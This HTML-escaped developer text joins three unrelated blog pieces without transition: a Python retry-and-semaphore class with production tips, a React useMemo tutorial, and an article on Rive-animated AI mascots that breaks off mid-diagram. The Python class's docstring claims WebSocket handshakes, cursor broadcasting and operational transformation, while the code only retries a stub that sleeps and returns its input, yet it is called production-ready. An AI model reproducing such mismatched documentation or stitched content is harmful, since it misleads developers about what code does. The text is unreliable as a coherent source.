&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ResilientProcessor&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="sh"&gt;"""&lt;/span&gt;&lt;span class="s"&gt;Production-ready processor addressing: WebSocket protocol handshakes, broadcasting cursor positions and canvas events, operational transformation basics, and managing reconnects.&lt;/span&gt;&lt;span class="sh"&gt;"""&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;concurrency_limit&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;semaphore&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Semaphore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;concurrency_limit&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;execute_with_guardrails&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ExecutionContext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;semaphore&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nf"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;retries&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;Processing task &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_id&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;, attempt &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;attempt&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;_process_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
&lt;span class="nf"&gt;except &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ConnectionError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;TimeoutError&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="n"&gt;backoff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;attempt&lt;/span&gt;
&lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;warning&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;Transient error on &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_id&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;. Retrying in &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;backoff&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;s...&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;backoff&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="nb"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="n"&gt;logger&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;Permanent failure processing &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_id&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s"&gt;: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ex&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;raise&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_process_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ExecutionContext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.05&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;task_id&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;status&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;completed&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="s"&gt;meta&lt;/span&gt;&lt;span class="sh"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;


Production Gotchas to Avoid
&lt;/h3&gt;

&lt;p&gt;When deploying this architecture at scale, keep these three operational realities in mind:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;strong&gt;Beware of Unbounded Queues&lt;/strong&gt;: Always place hard limits on in-memory buffers and connection queues. An unbounded queue simply hides backpressure until the process encounters an Out-Of-Memory (OOM) crash.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Set Aggressive Timeouts&lt;/strong&gt;: Never make external network or storage calls without explicit connection and read timeouts. A single hanging dependency can exhaust worker pools system-wide.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Ensure Idempotency&lt;/strong&gt;: Network packets get dropped and clients retry. Ensure that mutating operations can be executed multiple times safely without producing duplicate side-effects.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3&gt;


Summary Checklist
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;[x] &lt;strong&gt;Validate at the boundary&lt;/strong&gt;: Ensure invalid states never penetrate deep domain layers.&lt;/li&gt;
&lt;li&gt;[x] &lt;strong&gt;Enforce bounded resource limits&lt;/strong&gt;: Protect memory, connections, and CPU threads against unexpected spikes.&lt;/li&gt;
&lt;li&gt;[x] &lt;strong&gt;Log structured telemetry&lt;/strong&gt;: Attach correlation IDs to log records for rapid root-cause analysis during outages.&lt;/li&gt;
&lt;li&gt;[x] &lt;strong&gt;Design for failure&lt;/strong&gt;: Always provide graceful fallbacks and fast-failure mechanisms when dependencies degrade.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When building React applications, components can re-render many times. During re-rendering, some calculations may run again even when the data has not changed. To avoid unnecessary calculations, React provides a Hook called &lt;code&gt;useMemo&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;


What is &lt;code&gt;useMemo&lt;/code&gt;?
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;useMemo&lt;/code&gt; is a React Hook that remembers, or caches, the result of a calculation. React can reuse the previous result when its dependencies have not changed.&lt;/p&gt;

&lt;p&gt;For example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;useMemo&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;react&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;number&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here, &lt;code&gt;number&lt;/code&gt; is the dependency. If its value stays the same, React can reuse the cached result instead of recalculating it.&lt;/p&gt;

&lt;h2&gt;


Why Do We Need &lt;code&gt;useMemo&lt;/code&gt;?
&lt;/h2&gt;

&lt;p&gt;Imagine a college application that displays student results. The application filters thousands of student records to find students who scored above 80 marks.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;topStudents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;students&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="nx"&gt;student&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;student&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;marks&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;students&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here, React can reuse the filtered student list when the &lt;code&gt;students&lt;/code&gt; dependency remains unchanged. If the student data changes, React recalculates the list.&lt;/p&gt;

&lt;h2&gt;


Understanding the Dependency Array
&lt;/h2&gt;

&lt;p&gt;The dependency array tells React which values the calculation depends on.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight jsx"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;total&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;useMemo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;price&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;quantity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;price&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;quantity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If either &lt;code&gt;price&lt;/code&gt; or &lt;code&gt;quantity&lt;/code&gt; changes, React recalculates the total. If neither changes, React can reuse the previous result.&lt;/p&gt;

&lt;h2&gt;


When Should We Use &lt;code&gt;useMemo&lt;/code&gt;?
&lt;/h2&gt;

&lt;p&gt;We can use &lt;code&gt;useMemo&lt;/code&gt; when performing expensive calculations, filtering large datasets, sorting records, or processing complex data.&lt;/p&gt;

&lt;p&gt;However, we should not use it for every small calculation. For simple operations, using &lt;code&gt;useMemo&lt;/code&gt; may add unnecessary complexity without providing much benefit.&lt;/p&gt;

&lt;p&gt;It is also important to understand that &lt;code&gt;useMemo&lt;/code&gt; does not prevent a component from re-rendering. It only helps avoid unnecessary recalculations.&lt;/p&gt;

&lt;h2&gt;


Conclusion
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;useMemo&lt;/code&gt; is a useful React Hook for improving performance when calculations are expensive. It caches a calculation result between renders and recalculates it when its dependencies change.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;AI agents can think, plan, and respond. But can your users actually tell what they're doing? Let's explore how interactive animation, Rive, and React can make AI assistants feel more responsive, expressive, and human-friendly.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;AI agents are becoming a familiar part of modern web applications.&lt;/p&gt;

&lt;p&gt;They're answering customer questions, helping users complete tasks, generating content, analyzing data, and automating entire workflows.&lt;/p&gt;

&lt;p&gt;But there's one thing many AI interfaces still have in common.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;They look like a chat box.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You type a message, wait for a response, and watch a few dots animate while the AI processes your request.&lt;/p&gt;

&lt;p&gt;That works.&lt;/p&gt;

&lt;p&gt;But what if your AI assistant could communicate what it's doing through movement, expressions, and real-time reactions?&lt;/p&gt;

&lt;p&gt;Imagine an assistant that:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Welcomes users when they open the application.&lt;/li&gt;
&lt;li&gt;Listens attentively while someone speaks.&lt;/li&gt;
&lt;li&gt;Shows a thoughtful expression while generating a response.&lt;/li&gt;
&lt;li&gt;Moves its mouth naturally when speaking.&lt;/li&gt;
&lt;li&gt;Celebrates when a task is completed.&lt;/li&gt;
&lt;li&gt;Reacts gently when something goes wrong.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This is where &lt;strong&gt;interactive AI characters and animated mascots&lt;/strong&gt; can make a difference.&lt;/p&gt;

&lt;p&gt;And tools like Rive make it possible to build these experiences for production web applications.&lt;/p&gt;

&lt;p&gt;Let's explore how.&lt;/p&gt;




&lt;h2&gt;


1. The Problem With Traditional AI Chat Interfaces
&lt;/h2&gt;

&lt;p&gt;Most AI-powered products have a similar interaction pattern:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;User Input → Loading Indicator → AI Response&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;From a technical perspective, that's completely reasonable.&lt;/p&gt;

&lt;p&gt;But from a user experience perspective, there's often a communication gap.&lt;/p&gt;

&lt;p&gt;Consider a voice AI assistant.&lt;/p&gt;

&lt;p&gt;When a user finishes speaking, they might wonder:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Did the assistant hear me?&lt;/li&gt;
&lt;li&gt;Is it processing my request?&lt;/li&gt;
&lt;li&gt;Is it about to respond?&lt;/li&gt;
&lt;li&gt;Has something gone wrong?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A loading spinner communicates activity, but it doesn't necessarily communicate &lt;em&gt;which activity&lt;/em&gt; is happening.&lt;/p&gt;

&lt;p&gt;An animated AI character can offer an additional layer of visual feedback.&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;AI Activity&lt;/th&gt;
&lt;th&gt;Visual Behavior&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ready&lt;/td&gt;
&lt;td&gt;Natural breathing, blinking&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Listening&lt;/td&gt;
&lt;td&gt;Attentive eyes, subtle head movement&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Thinking&lt;/td&gt;
&lt;td&gt;Thoughtful expression, slower motion&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Speaking&lt;/td&gt;
&lt;td&gt;Mouth animation, facial movement&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Success&lt;/td&gt;
&lt;td&gt;Smile, small celebration&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Error&lt;/td&gt;
&lt;td&gt;Concerned or reassuring expression&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;p&gt;These behaviors can help users understand the current interaction without repeatedly reading status messages.&lt;/p&gt;

&lt;p&gt;Of course, animation should support clear text and accessibility features, not replace them.&lt;/p&gt;

&lt;p&gt;The goal isn't to make an AI system pretend to be human.&lt;/p&gt;

&lt;p&gt;It's to make its interface easier to understand.&lt;/p&gt;

&lt;h2&gt;


2. What Is an Interactive AI Mascot?
&lt;/h2&gt;

&lt;p&gt;An interactive AI mascot is an animated character that responds to events from an application.&lt;/p&gt;

&lt;p&gt;Unlike a traditional GIF or looping video, its behavior can change dynamically.&lt;/p&gt;

&lt;p&gt;For example, your application might send a status update:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;activity = "thinking"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The mascot responds by switching into a thinking animation.&lt;/p&gt;

&lt;p&gt;When the AI starts speaking:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;activity = "speaking"&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The character transitions into a speaking state.&lt;/p&gt;

&lt;p&gt;These transitions are driven by application logic rather than a fixed video timeline.&lt;/p&gt;

&lt;p&gt;An interactive mascot might also receive additional information:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Emotion or response tone&lt;/li&gt;
&lt;li&gt;Audio intensity&lt;/li&gt;
&lt;li&gt;Mouth shape or viseme&lt;/li&gt;
&lt;li&gt;Cursor position&lt;/li&gt;
&lt;li&gt;User interaction events&lt;/li&gt;
&lt;li&gt;Task completion events&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This creates opportunities for more expressive interfaces without relying on prerecorded videos for every possible interaction.&lt;/p&gt;

&lt;h2&gt;


3. Why Use Rive for AI Character Animation?
&lt;/h2&gt;

&lt;p&gt;Rive is a real-time interactive animation tool designed for applications, websites, and games.&lt;/p&gt;

&lt;p&gt;It's particularly useful when visual elements need to respond to changing application state.&lt;/p&gt;

&lt;p&gt;With Rive, designers can build animated characters and define how different animations interact.&lt;/p&gt;

&lt;p&gt;Developers can then connect the animation system to their application through supported runtimes.&lt;/p&gt;

&lt;p&gt;For an AI assistant, several Rive capabilities are especially useful.&lt;/p&gt;

&lt;h3&gt;


State Machines
&lt;/h3&gt;

&lt;p&gt;State machines manage how animations transition between behaviors.&lt;/p&gt;

&lt;p&gt;For example:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Idle → Listening → Thinking → Speaking → Idle&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But real AI interactions aren't always linear.&lt;/p&gt;

&lt;p&gt;A user might interrupt an assistant while it's speaking.&lt;/p&gt;

&lt;p&gt;A network request could fail during thinking.&lt;/p&gt;

&lt;p&gt;Or a user might close the voice interface entirely.&lt;/p&gt;

&lt;p&gt;A well-designed state machine can account for these situations.&lt;/p&gt;

&lt;h3&gt;


Data Binding
&lt;/h3&gt;

&lt;p&gt;Rive Data Binding allows application data to influence visual properties and animation behavior.&lt;/p&gt;

&lt;p&gt;You can expose values such as activity, emotion, or audio level and connect them to your character's animation system.&lt;/p&gt;

&lt;p&gt;This creates a useful separation between application logic and character animation.&lt;/p&gt;

&lt;h3&gt;


Reusable Character Rigs
&lt;/h3&gt;

&lt;p&gt;A reusable rig lets one character support different behaviors and expressions without requiring a completely separate design for every state.&lt;/p&gt;

&lt;h3&gt;


Runtime Integration
&lt;/h3&gt;

&lt;p&gt;Rive supports web and mobile development workflows, making it suitable for interactive experiences across different platforms.&lt;/p&gt;

&lt;p&gt;The important advantage isn't simply that Rive can animate a character.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;It's that the animation can respond to the product.&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;


4. Designing the AI Assistant's Behavior System
&lt;/h2&gt;

&lt;p&gt;Before animating a character, define what your AI assistant actually needs to communicate.&lt;/p&gt;

&lt;p&gt;For a conversational web assistant, I would typically start with six core activities.&lt;/p&gt;

&lt;h3&gt;


Idle
&lt;/h3&gt;

&lt;p&gt;The character is available but isn't currently interacting.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Subtle breathing&lt;/li&gt;
&lt;li&gt;Natural blinking&lt;/li&gt;
&lt;li&gt;Small head movements&lt;/li&gt;
&lt;li&gt;Occasional eye movement&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Good idle animation should make the character feel present without distracting users from the interface.&lt;/p&gt;

&lt;h3&gt;


Listening
&lt;/h3&gt;

&lt;p&gt;The assistant is receiving user input.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Attentive eye expression&lt;/li&gt;
&lt;li&gt;Slight head tilt&lt;/li&gt;
&lt;li&gt;Gentle reactive movement&lt;/li&gt;
&lt;li&gt;Subtle response to microphone activity&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Avoid exaggerated movement that could suggest the assistant is speaking when it's actually listening.&lt;/p&gt;

&lt;h3&gt;


Thinking
&lt;/h3&gt;

&lt;p&gt;The assistant is processing a request.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Thoughtful facial expression&lt;/li&gt;
&lt;li&gt;Slow eye movement&lt;/li&gt;
&lt;li&gt;Gentle head movement&lt;/li&gt;
&lt;li&gt;Controlled looping animation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thinking animations should communicate progress without implying the AI has a particular internal emotion.&lt;/p&gt;

&lt;h3&gt;


Speaking
&lt;/h3&gt;

&lt;p&gt;The assistant is delivering a response.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Mouth animation&lt;/li&gt;
&lt;li&gt;Facial expressions&lt;/li&gt;
&lt;li&gt;Natural head movement&lt;/li&gt;
&lt;li&gt;Small gestures&lt;/li&gt;
&lt;li&gt;Audio-reactive animation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For voice applications, you can go beyond a simple open-and-close mouth animation.&lt;/p&gt;

&lt;p&gt;More on that shortly.&lt;/p&gt;

&lt;h3&gt;


Success
&lt;/h3&gt;

&lt;p&gt;The assistant completes a task.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Smile&lt;/li&gt;
&lt;li&gt;Celebration gesture&lt;/li&gt;
&lt;li&gt;Small jump&lt;/li&gt;
&lt;li&gt;Positive facial expression&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Success reactions work well when used selectively.&lt;/p&gt;

&lt;p&gt;Celebrating after every basic message quickly becomes repetitive.&lt;/p&gt;

&lt;h3&gt;


Error
&lt;/h3&gt;

&lt;p&gt;Something goes wrong.&lt;/p&gt;

&lt;p&gt;Possible movements:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Concerned expression&lt;/li&gt;
&lt;li&gt;Small apologetic gesture&lt;/li&gt;
&lt;li&gt;Return to a calm resting pose&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The animation should complement an actionable error message explaining what happened.&lt;/p&gt;

&lt;h2&gt;


5. Connecting an AI Agent to an Animated Character
&lt;/h2&gt;

&lt;p&gt;Here's a simple architecture for connecting an AI agent to an interactive Rive character.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;              USER
|
v
React Application
|
v
AI Agent Controller
|
+-------+--------+
|                |
v                v
AI Backend       UI Activity
/ Voice API       Controller
|                |
